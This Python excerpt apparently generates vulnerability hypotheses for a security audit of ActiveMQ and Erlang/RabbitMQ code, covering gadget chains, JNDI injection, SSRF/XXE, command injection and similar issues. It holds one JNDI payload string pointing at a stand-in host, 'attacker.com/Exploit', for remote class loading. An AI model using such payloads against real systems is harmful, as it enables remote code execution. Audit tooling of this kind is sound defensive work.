...
def generate_gadget_chain_hypotheses():
    """Generate gadget chain attack hypotheses"""
    chains = []

    # Entry points that lead to chains
    entry_points = [
        "OpenWire protocol message",
        "JMX ObjectMessage",
        "STOMP frame",
        "AMQP message",
        "REST API input",
    ...
    # Chain types
    chain_types = [
        ("commons-collections", "ChainedTransformer → InvokerTransformer"),
        ("spring-core", "ClassPathXmlApplicationContext from URL"),
        ("rome", "ROME gadget chain"),
        ("jdom", "JDOM parsing chain"),
        ("xstream", "XStream deserialization"),
        ("groovy", "Groovy script evaluation"),
        ("jython", "Jython script evaluation"),
        ("rhino", "Rhino JavaScript evaluation"),
        ("nashorn", "Nashorn JavaScript evaluation"),
        ("velocity", "Velocity template injection"),
        ("freemarker", "FreeMarker template injection"),
        ("ognl", "OGNL expression evaluation"),
        ("spel", "Spring Expression Language"),
        ("el", "Expression Language injection"),
        ("mvel", "MVEL expression evaluation"),
    ]

    for i, entry in enumerate(entry_points):
        for j, (chain_name, chain_desc) in enumerate(chain_types):
            hyp_id = f"hyp_chain_{i}_{j}_{chain_name}"
            chains.append({
                "id": hyp_id,
                "title": f"Gadget chain RCE: {chain_name} via {entry}",
                "control": "C-007",
                "sink": chain_name,
                "description": f"Attacker-controlled {entry} triggers {chain_desc} gadget chain → RCE"
            })

    return chains


def generate_entry_point_hypotheses():
    """Generate entry point + sink mapping hypotheses"""
    entry_points = []

    # Entry point sources
    sources = [
        ("OpenWire protocol", "org.apache.activemq.openwire"),
        ("STOMP protocol", "org.apache.activemq.stomp"),
        ("AMQP protocol", "org.apache.activemq.openwire.amqp"),
        ("JMX interface", "org.apache.activemq.management"),
        ("REST endpoint", "org.apache.activemq.api"),
        ("Configuration file", "activemq.xml"),
        ("Web console", "org.apache.activemq.web"),
        ("Network listener", "ServerSocket"),
        ("File watcher", "FileSystem"),
        ("Database connection", "JDBC"),
        ("JNDI service", "javax.naming"),
        ("HTTP client", "java.net.URL"),
        ("XML parser", "SAXParser"),
        ("YAML parser", "Yaml"),
        ("JSON parser", "Jackson"),
    ]

    # Dangerous sinks to reach
    sinks = [
        ...
        "SAXParserFactory.parse",
        "Yaml.load",
        "ObjectMapper.readValue",
        "XStream.fromXML",
    ]

    for i, (source, package_name) in enumerate(sources):
        for j, sink in enumerate(sinks):
            hyp_id = f"hyp_entry_{i}_{j}"
            entry_points.append({
                "id": hyp_id,
                "title": f"{source} → {sink}",
                "control": "C-002",
                "sink": sink,
                "description": f"Attacker input from {source} reaches {sink} without validation"
            })

    return entry_points


def generate_jndi_ldap_hypotheses():
    """Generate JNDI/LDAP injection hypotheses"""
    jndi = []
    ...
    ldap_payloads = [
        ...
        "JNDI:oc://attacker.com/Exploit",
        "Class name injection via reference",
        "Factory class specification",
    ]

    for i, sink in enumerate(jndi_sinks):
        for j, payload in enumerate(ldap_payloads):
            hyp_id = f"hyp_jndi_{i}_{j}"
            jndi.append({
                "id": hyp_id,
                "title": f"JNDI injection via {sink}: {payload}",
                "control": "C-008",
                "sink": sink,
                "description": f"Attacker-controlled JNDI string to {sink} enables remote class loading"
            })

    return jndi


def generate_url_handling_hypotheses():
    """Generate URL/network handling vulnerabilities"""
    url_hyps = []

    url_sinks = [
        ("URL.openConnection", "SSRF via HTTP/FTP/file protocols"),
        ("URLClassLoader", "Remote JAR loading"),
        ("URL.openStream", "Resource fetching"),
        ("HttpClient.execute", "HTTP request with attacker URL"),
        ("ImageIO.read", "Image loading from attacker URL"),
        ("javax.xml.parsers", "XXE via entity resolution"),
        ("SAXParserFactory.parse", "XXE via SAX parser"),
        ("DocumentBuilderFactory.parse", "XXE via DOM parser"),
    ]
    ...
    for i, (sink, desc) in enumerate(url_sinks):
        for j, source in enumerate(url_sources):
            hyp_id = f"hyp_url_{i}_{j}"
            url_hyps.append({
                "id": hyp_id,
                "title": f"{desc} from {source}",
                "control": "C-008",
                "sink": sink,
                "description": f"Attacker-controlled URL from {source} passed to {sink}"
            })
...
def generate_erlang_deserialization_hypotheses():
    """Generate Erlang deserialization attack hypotheses"""
    deser = []
    # Erlang-specific deserialization vectors
    sinks = ["binary_to_term", "erl_parse", "erl_scan", "term_to_binary"]
    sources = ["network message", "file input", "RPC call", "distributed node", "plugin code"]

    for i, sink in enumerate(sinks):
        for j, source in enumerate(sources):
            hyp_id = f"hyp_erl_deser_{i}_{j}"
            deser.append({
                "id": hyp_id,
                "title": f"Erlang deserialization via {sink} from {source}",
                "control": "C-007",
                "sink": sink,
                "description": f"Untrusted {source} deserialized via {sink} enabling code execution"
            })
    return deser


def generate_erlang_command_injection_hypotheses():
    """Generate Erlang OS command injection hypotheses"""
    cmd_inj = []
    sinks = ["os:system", "os:cmd", "os:exec", "erlang:open_port"]
    sources = ["HTTP parameter", "config file", "message queue", "RPC argument", "CLI input"]

    for i, sink in enumerate(sinks):
        for j, source in enumerate(sources):
            hyp_id = f"hyp_erl_cmd_{i}_{j}"
            cmd_inj.append({
                "id": hyp_id,
                "title": f"Command injection via {sink} from {source}",
                "control": "C-001",
                "sink": sink,
                "description": f"Unsanitized {source} passed to {sink} for OS command execution"
            })
    return cmd_inj


def generate_erlang_rpc_hypotheses():
    """Generate Erlang RPC and distributed system vulnerabilities"""
    rpc_vulns = []
    sinks = ["rpc:call", "rpc:cast", "gen_rpc", "distributed_erlang", "erlang:apply"]
    issues = [
        ("Authentication bypass", "No authentication on RPC calls"),
        ("Unsafe apply", "Untrusted module/function in apply/3"),
        ("Node injection", "Untrusted node names in distributed calls"),
        ("Code injection", "Arbitrary module loading"),
    ]

    for i, sink in enumerate(sinks):
        for j, (issue_type, desc) in enumerate(issues):
            hyp_id = f"hyp_erl_rpc_{i}_{j}"
            rpc_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} via {sink}",
                "control": "C-002",
                "sink": sink,
                "description": desc
            })
...
def generate_erlang_file_vulnerabilities():
    """Generate Erlang file operation vulnerabilities"""
    file_vulns = []
    sinks = ["file:read_file", "file:write_file", "file:open", "file:list_dir", "file:delete"]
    issues = [
        ("Path traversal", "File path from user input without validation"),
        ("Symlink attack", "No checks for symlink attacks in file operations"),
        ("Race condition", "TOCTOU vulnerability in file access"),
        ("Permissions", "Missing permission checks on file operations"),
    ]

    for i, sink in enumerate(sinks):
        for j, (issue_type, desc) in enumerate(issues):
            hyp_id = f"hyp_erl_file_{i}_{j}"
            file_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} in {sink}",
                "control": "C-003",
                "sink": sink,
                "description": desc
            })
...
def generate_erlang_nif_hypotheses():
    """Generate Erlang NIF (Native Interface) vulnerabilities"""
    nif_vulns = []
    issues = [
        ("Buffer overflow", "NIF code with unsafe memory operations"),
        ("Code injection", "Untrusted input passed to NIF"),
        ("Resource leak", "Missing cleanup in NIF calls"),
        ("Type confusion", "Improper type checking in NIF interface"),
    ]

    for i, (issue_type, desc) in enumerate(issues):
        for j in range(3):  # 3 variants each
            hyp_id = f"hyp_erl_nif_{i}_{j}"
            nif_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} in NIF interface variant {j}",
                "control": "C-001",
                "sink": "erl_nif:*",
                "description": desc
            })
...
def generate_erlang_amqp_hypotheses():
    """Generate Erlang AMQP protocol vulnerabilities (RabbitMQ-specific)"""
    amqp_vulns = []
    issues = [
        ("Message deserialization", "Untrusted AMQP message deserialization"),
        ("Header injection", "AMQP header from untrusted source"),
        ("Queue operation", "Unsafe queue/exchange creation from user input"),
        ("Auth bypass", "AMQP authentication/authorization bypass"),
        ("DoS", "Resource exhaustion via AMQP messages"),
    ]

    for i, (issue_type, desc) in enumerate(issues):
        for j in range(3):  # 3 variants each
            hyp_id = f"hyp_erl_amqp_{i}_{j}"
            amqp_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} in AMQP handler variant {j}",
                "control": "C-002",
                "sink": "AMQP message handler",
                "description": desc
            })
    return amqp_vulns


def generate_erlang_plugin_hypotheses():
    """Generate Erlang plugin/module loading vulnerabilities"""
    plugin_vulns = []
    issues = [
        ("Module loading", "Arbitrary Erlang module loading"),
        ("Code update", "Unsafe code reloading without validation"),
        ("Plugin path", "Untrusted path in plugin directory"),
        ("Version bypass", "Version check bypass in plugin updates"),
    ]

    for i, (issue_type, desc) in enumerate(issues):
        for j in range(4):  # 4 variants
            hyp_id = f"hyp_erl_plugin_{i}_{j}"
            plugin_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} vulnerability variant {j}",
                "control": "C-001",
                "sink": "code loading system",
                "description": desc
            })
    return plugin_vulns


def generate_erlang_memory_vulnerabilities():
    """Generate Erlang memory and resource vulnerabilities"""
    mem_vulns = []
    issues = [
        ("Memory leak", "Unbounded memory allocation"),
        ("Atom exhaustion", "Unlimited atom creation from input"),
        ("Process spawn", "Unbounded process creation"),
        ("List explosion", "List/string operations without bounds"),
    ]

    for i, (issue_type, desc) in enumerate(issues):
        for j in range(3):  # 3 variants
            hyp_id = f"hyp_erl_mem_{i}_{j}"
            mem_vulns.append({
                "id": hyp_id,
                "title": f"{issue_type} variant {j}",
                "control": "C-010",
                "sink": "memory allocation",
                "description": desc
            })
    return mem_vulns
...
def generate_hypotheses(project_root: Path, count: int = 100) -> int:
    ...
    if count > len(HYPOTHESIS_TEMPLATES):
        ...
        all_hypotheses.extend(generate_gadget_chain_hypotheses())
        all_hypotheses.extend(generate_entry_point_hypotheses())
        all_hypotheses.extend(generate_jndi_ldap_hypotheses())
        all_hypotheses.extend(generate_url_handling_hypotheses())

        # Erlang-specific hypothesis generators
        all_hypotheses.extend(generate_erlang_deserialization_hypotheses())
        all_hypotheses.extend(generate_erlang_command_injection_hypotheses())
        all_hypotheses.extend(generate_erlang_rpc_hypotheses())
        all_hypotheses.extend(generate_erlang_file_vulnerabilities())
        all_hypotheses.extend(generate_erlang_nif_hypotheses())
        all_hypotheses.extend(generate_erlang_amqp_hypotheses())
        all_hypotheses.extend(generate_erlang_plugin_hypotheses())
        all_hypotheses.extend(generate_erlang_memory_vulnerabilities())
